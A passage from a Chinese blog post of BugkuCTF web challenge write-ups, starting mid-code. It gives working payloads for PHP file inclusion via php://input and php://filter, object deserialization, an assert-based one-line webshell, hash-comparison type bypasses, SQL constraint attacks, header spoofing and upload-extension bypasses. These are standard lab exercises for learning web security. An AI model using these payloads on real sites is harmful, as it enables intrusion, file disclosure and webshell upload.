</span></span><span style="display:flex;"><span>lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q
</span></span><span style="display:flex;"><span>lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN
</span></span><span style="display:flex;"><span>CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU
</span></span><span style="display:flex;"><span>yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R
</span></span><span style="display:flex;"><span>ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ
</span></span><span style="display:flex;"><span>DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI
</span></span><span style="display:flex;"><span>xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU
</span></span><span style="display:flex;"><span>wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>D<span style="color:#f92672">--%</span><span style="color:#ae81ff">3</span>E<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print urllib<span style="color:#f92672">.</span>unquote(a)
</span></span></code></pre></div><p>这里面出来的是base64编码的东西，解码得到</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;;if(!</span><span style="color:#e6db74">$_GET[&#39;id&#39;]</span><span style="color:#e6db74">)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        header(&#39;Location: hello.php?id=1&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        exit();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">$id</span><span style="color:#e6db74">=</span><span style="color:#e6db74">$_GET[&#39;id&#39;]</span><span style="color:#e6db74">;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">$a</span><span style="color:#e6db74">=</span><span style="color:#e6db74">$_GET[&#39;a&#39;]</span><span style="color:#e6db74">;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">$b</span><span style="color:#e6db74">=</span><span style="color:#e6db74">$_GET[&#39;b&#39;]</span><span style="color:#e6db74">;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">if(stripos(</span><span style="color:#e6db74">$a</span><span style="color:#e6db74">,&#39;.&#39;))
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        echo &#39;no no no no no no no&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        return ;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">$data</span><span style="color:#e6db74"> = @file_get_contents(</span><span style="color:#e6db74">$a</span><span style="color:#e6db74">,&#39;r&#39;);//file_get_contents - 将整个文件读入字符串
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">if(</span><span style="color:#e6db74">$data</span><span style="color:#e6db74">==&#34;</span><span style="color:#a6e22e">bugku</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">nice</span> <span style="color:#a6e22e">plateform</span><span style="color:#f92672">!</span><span style="color:#e6db74">&#34; and </span><span style="color:#e6db74">$id</span><span style="color:#e6db74">==0 and strlen(</span><span style="color:#e6db74">$b</span><span style="color:#e6db74">)&gt;5 and eregi(&#34;</span><span style="color:#ae81ff">111</span><span style="color:#e6db74">&#34;.substr(</span><span style="color:#e6db74">$b</span><span style="color:#e6db74">,0,1),&#34;</span><span style="color:#ae81ff">1114</span><span style="color:#e6db74">&#34;) and substr(</span><span style="color:#e6db74">$b</span><span style="color:#e6db74">,0,1)!=4)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">//eregi是正则匹配函数
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        require(&#34;</span><span style="color:#a6e22e">f4l2a3g</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span><span style="color:#e6db74">&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">else
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        print &#34;</span><span style="color:#a6e22e">never</span> <span style="color:#a6e22e">never</span> <span style="color:#a6e22e">never</span> <span style="color:#a6e22e">give</span> <span style="color:#a6e22e">up</span> <span style="color:#f92672">!!!</span><span style="color:#e6db74">&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?&gt;
</span></span></span></code></pre></div><p>其实直接在url里面写一个f4l2a3g.txt就可以得到flag了</p>
<ul>
<li>正解如下：</li>
</ul>
<p>题目的意思是要满足以下条件：</p>
<ul>
<li>
<p>id不等于0</p>
</li>
<li>
<p>id弱等于0，那么查看php的表格发现字符串弱等于0，所以让id=“ijk”</p>
</li>
<li>
<p>b的第一个字符不等于4，又要让“111”.substr(b,0,1)和“1114”匹配起来。eregi函数可以用截断字符\x00绕过
但是注意在输入url的时候\x00会被转码，导致url被截断。注意，虽然 b=%0012345 实际字符串长度为 8 字节，
但在后台脚本读入数据时，会将 URL 编码 %00 转换成 1 字节。所以说，空字符应该在后台脚本的变量中出现，
而不是在 URL 查询字符串变量中出现。</p>
</li>
<li>
<p>$data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流。
在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。
伪协议 php:// 来访问输入输出的数据流，其中 php://input 可以访问原始请求数据中的只读流。</p>
</li>
</ul>
<p>所以构造如下：</p>
<pre><code>id=&quot;int&quot;&amp;b=%0012345&amp;a=php://input 并在burp的请求头中添加bugku is a nice plateform!
</code></pre>
<h2 id="welcome-to-the-bugkuctf">welcome to the bugkuctf<a hidden class="anchor" aria-hidden="true" href="#welcome-to-the-bugkuctf">#</a></h2>
<p>进入源代码界面，file_get_contents说明得是数据流，看到hint.php,然后再检索框里面输入：</p>
<pre><code>index.php?txt=php://input&amp;file=hint.php
并且在burpsuite中添加welcome to thebugkuctf
</code></pre>
<p>得到的只是hint.php的效果界面，要看到hint的源码，要这样输入</p>
<pre><code>index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php
</code></pre>
<p>输出一堆base64编码，解码得到</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Flag</span>{<span style="color:#75715e">//flag.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __tostring(){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>)){
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>);
</span></span><span style="display:flex;"><span>                      <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">return</span> (<span style="color:#e6db74">&#34;good&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>同样的道理，使用
index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>解码得到了index.php的源代码。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$txt <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;txt&#34;</span>];
</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;file&#34;</span>];
</span></span><span style="display:flex;"><span>$password <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;password&#34;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($txt)<span style="color:#f92672">&amp;&amp;</span>(<span style="color:#a6e22e">file_get_contents</span>($txt,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;welcome to the bugkuctf&#34;</span>)){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;hello friend!&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/&#34;</span>,$file)){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;不能现在就给你flag哦&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>();
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span>($file);
</span></span><span style="display:flex;"><span>        $password <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($password);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $password;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you are not the number of bugku ! &#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$user = $_GET[&#34;txt&#34;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$file = $_GET[&#34;file&#34;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$pass = $_GET[&#34;password&#34;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&#34;welcome to the bugkuctf&#34;)){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    echo &#34;hello admin!&lt;br&gt;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    include($file); //hint.php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}else{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    echo &#34;you are not admin ! &#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> --&gt;
</span></span></span></code></pre></div><p>显然这里不让我们再file中输入flag文件名。但是Flag类在构造对象的时候会执行构造函数，这个时候
有机会echo出我们要的文件。但是要怎么利用password来传入我们要的对象呢？看到了unseialize反序列函数
这个函数可以把对象从序列化的字符串还原出对象来.在PHP中,序列化用于存储或传递<em>PHP 的值</em>的过程中,同时不丢失其类型和结构</p>
<p>所以我们编写如下代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Class</span> <span style="color:#a6e22e">Flag</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> $file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;flag.php&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Flag</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($a);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>输出O:4:&ldquo;Flag&rdquo;:1:{s:4:&ldquo;file&rdquo;;s:8:&ldquo;flag.php&rdquo;;}</p>
<p>于是传入参数index.php?txt=welcome to the bugkuctf&amp;file=hint.php&amp;password=O:4:&ldquo;Flag&rdquo;:1:{s:4:&ldquo;file&rdquo;;s:8:&ldquo;flag.php&rdquo;;}</p>
<p>得到flag</p>
<h2 id="过狗一句话">过狗一句话<a hidden class="anchor" aria-hidden="true" href="#过狗一句话">#</a></h2>
<p>刚开始给我们的php代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> $poc<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a#s#s#e#r#t&#34;</span>;
</span></span><span style="display:flex;"><span>$poc_1<span style="color:#f92672">=</span><span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;#&#34;</span>,$poc);
</span></span><span style="display:flex;"><span>$poc_2<span style="color:#f92672">=</span>$poc_1[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>$poc_1[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>$poc_1[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>$poc_1[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>$poc_1[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">.</span>$poc_1[<span style="color:#ae81ff">5</span>]; $poc_2($_GET[<span style="color:#e6db74">&#39;s&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>看意思explode就是根据第一参数的规则将目标划分为一个数组。那么pro2就是assert的意思
assert（）一个东西，如果字符串会被当做代码执行，否则是false</p>
<p>以下解法
试探一下：?index.php?s=phpinfo();//可以正常执行
?index.php?s=print_r(scandir(./)) //./的意思应该是在当前目录下，scan扫描目录文件返回一个数组</p>
<pre><code>显示了flag所处的txt文件夹，之后用var_dump()或者show_source()或者直接访问都可以
</code></pre>
<h2 id="字符正则">字符？正则？<a hidden class="anchor" aria-hidden="true" href="#字符正则">#</a></h2>
<p>打开网页，要求匹配的正则式子如下：</p>
<pre><code>  /key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i
</code></pre>
<ul>
<li>
<p>/。。。。/这对东西标志正则表达式的开头和结尾，类似的还有#。。。#等</p>
</li>
<li>
<p>[[:punct:]] ：匹配任何标点符号；</p>
</li>
<li>
<p>/i  ：表示这个正则表达式对大小写不敏感；
一开始我写的匹配对象是这样的：</p>
<pre><code>http://123.206.87.240:8002/web10/?id=keykey00000key://keyb.
</code></pre>
</li>
</ul>
<p>但是失败原因是在最后两个斜杠上，他们在url输入的时候前一个会充当转义作用，实际输入的只有一个/
变成这样就好了：</p>
<pre><code>  http://123.206.87.240:8002/web10/?id=keykey00000key:///keyb.
</code></pre>
<h2 id="前女友">前女友<a hidden class="anchor" aria-hidden="true" href="#前女友">#</a></h2>
<p>打开源代码，发现在链接处有个链接，点进入是php代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;v1&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;v2&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;v3&#39;</span>])){
</span></span><span style="display:flex;"><span>    $v1 <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;v1&#39;</span>];
</span></span><span style="display:flex;"><span>    $v2 <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;v2&#39;</span>];
</span></span><span style="display:flex;"><span>    $v3 <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;v3&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($v1 <span style="color:#f92672">!=</span> $v2 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($v1) <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>($v2)){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>($v3, $flag)){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $flag;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>对于这里的md5，既可以采用md5碰撞的方法，也可以让两个变量都在输入的时候声明为数组得到false=false
，对于这里的strcmp可以试试把v3声明为一个不符合数据类型的东西比如说整数，这样可以让函数返回0(仅对php5.3之前版本有效)</p>
<pre><code>http://123.206.31.85:49162/index.php?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1

或者

http://123.206.31.85:49162/index.php?v1[]=1&amp;v2[]=2&amp;v3[]=1
</code></pre>
<h2 id="login1">login1<a hidden class="anchor" aria-hidden="true" href="#login1">#</a></h2>
<p>打开之后是登陆界面，提示说是sql约束攻击，具体博客教程看这里<a href="https://blog.csdn.net/wy_97/article/details/77972375">sql约束攻击</a></p>
<p>总而言之为了创建一个新的admin，我们注册以下账户：</p>
<pre><code>username：admin                                            1
password：2017zxwlB
</code></pre>
<ul>
<li>
<p>注册的时候，会首先查看是否有相同的用户名，但是因为select查询语句并不对超出最大长度限
制的检索对象进行尾部修剪，所以在这种情况下，我们注册的用户名在数据库中并不存在。</p>
</li>
<li>
<p>既然不存在，就会向表中插入这条新的用户数据，但是由于超出了varchar()所规定的长度，所以
超出部分会被截断，这是第一重处理，接下来数据库会把有效字符后面的空格都删掉，这是第二重处理
由此我们插入了一个admin用户，使用的是自己的密码就可以登陆</p>
</li>
</ul>
<p>登陆就好了。</p>
<h2 id="你从哪里来">你从哪里来<a hidden class="anchor" aria-hidden="true" href="#你从哪里来">#</a></h2>
<p>题目说 你是从谷歌来的吗？，在burpsuite中添加referer:https://www.google.com就可以了</p>
<h2 id="md5-collision">md5 collision<a hidden class="anchor" aria-hidden="true" href="#md5-collision">#</a></h2>
<p>从历史write up中记录的转化后的值为0的md5码中选两个出来作为参数就可以了</p>
<h2 id="程序员本地网站">程序员本地网站<a hidden class="anchor" aria-hidden="true" href="#程序员本地网站">#</a></h2>
<p>要求从本地访问，在burpsuite中添加一条x-forwarded-for:127.0.0.1就可以了！</p>
<h2 id="各种绕过">各种绕过<a hidden class="anchor" aria-hidden="true" href="#各种绕过">#</a></h2>
<p>打开网页之后看到的代码如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
</span></span><span style="display:flex;"><span>$_GET[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">urldecode</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>]);
</span></span><span style="display:flex;"><span>$flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{xxxxxxxxxxxxxxxxxx}&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;uname&#39;</span>]) <span style="color:#66d9ef">and</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>])) {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> ($_GET[<span style="color:#e6db74">&#39;uname&#39;</span>] <span style="color:#f92672">==</span> $_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;passwd can not be uname.&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sha1</span>($_GET[<span style="color:#e6db74">&#39;uname&#39;</span>]) <span style="color:#f92672">===</span> <span style="color:#a6e22e">sha1</span>($_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>])<span style="color:#f92672">&amp;</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;margin&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Flag: &#39;</span><span style="color:#f92672">.</span>$flag);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;sorry!&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>sha1是散列算法函数，返回散列值。这里传入两个不符合数据类型的数据来让两个都返回false就可以做到相等
，那么就让uname声明成为一个数组，并且用hackbar传一个数组类型的passwd进去。id=margin就行了。</p>
<h2 id="web8">web8<a hidden class="anchor" aria-hidden="true" href="#web8">#</a></h2>
<p>打开网站显示代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">extract</span>($_GET);<span style="color:#75715e">//解析所有通过get方式获取的变量
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($ac))
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>$f <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">file_get_contents</span>($fn));<span style="color:#75715e">//从打开fn所代表的文件，或者是文件流
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($ac <span style="color:#f92672">===</span> $f)<span style="color:#75715e">//强等于
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt;This is flag:&#34;</span> <span style="color:#f92672">.</span><span style="color:#e6db74">&#34; </span><span style="color:#e6db74">$flag</span><span style="color:#e6db74">&lt;/p&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt;sorry!&lt;/p&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>可知有两种解法：</p>
<ul>
<li>
<p>解法一：利用php://input传入fn一个值并让他和ac相等(这里很奇怪我的hackbar不能给php://input传数据，但是burpsuite应该可以)</p>
</li>
<li>
<p>解法二：根据题目提示，猜测有flag.txt在同级目录下，访问之看到文件内容显示flags，
那么让ac=flags，fn=flag.txt就可以得到flag了。</p>
</li>
</ul>
<h2 id="细心">细心<a hidden class="anchor" aria-hidden="true" href="#细心">#</a></h2>
<p>使用御剑软件扫描网站，发现有robots.txt,点进去显示</p>
<pre><code>User-agent: *
Disallow: /resusl.php
</code></pre>
<p>访问这个php文件试试，看到了显示里头警告不是管理员登陆，自己的ip已经被记录，第一反应是伪造本地访问</p>
<pre><code>Host: 127.0.0.1
Referer: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
</code></pre>
<p>这几种方式都可以在burpsuite中进行修改来伪造本地访问。(但是题目的考点似乎并不在此)</p>
<p>接下来显示</p>
<pre><code>By bugkuctf.

if ($_GET[x]==$password) 此处省略1w字
</code></pre>
<p>试一试把x赋值成admin试一试？刚开始题目的文字信息就让我们试试构造了admin，果然有了flag</p>
<pre><code>robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访
问的部分，或者指定搜索引擎只收录指定的内容。
当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时器人就会按照该文件中的内容来
确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。
</code></pre>
<h2 id="求getshell文件上传类型">求getshell（文件上传类型）<a hidden class="anchor" aria-hidden="true" href="#求getshell文件上传类型">#</a></h2>
<p>打开页面，要求发送图片文件而不是php文件。看网上说是黑名单过滤和类型检测，但是可以把
content-type 进行大小写绕过和类型修改，并且修改php文件的后缀名，可以修改成以下几种</p>
<pre><code>    php2, php3, php4, php5, phps, pht, phtm, phtml
</code></pre>
<p>试了以上几种之后，php5可以拿到flag。</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://ch3n9w.cpolar.cn/posts/ctf-crypto/">
    <span class="title">« Prev</span>
    <br>
    <span>密码学题目</span>
  </a>
  <a class="next" href="https://ch3n9w.cpolar.cn/posts/tech-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">
    <span class="title">Next »</span>
    <br>
    <span>使用hexo和github搭建网站</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://ch3n9w.cpolar.cn/">ch3n9w の 超元域</a></span> · 

    <span>
        Powered by
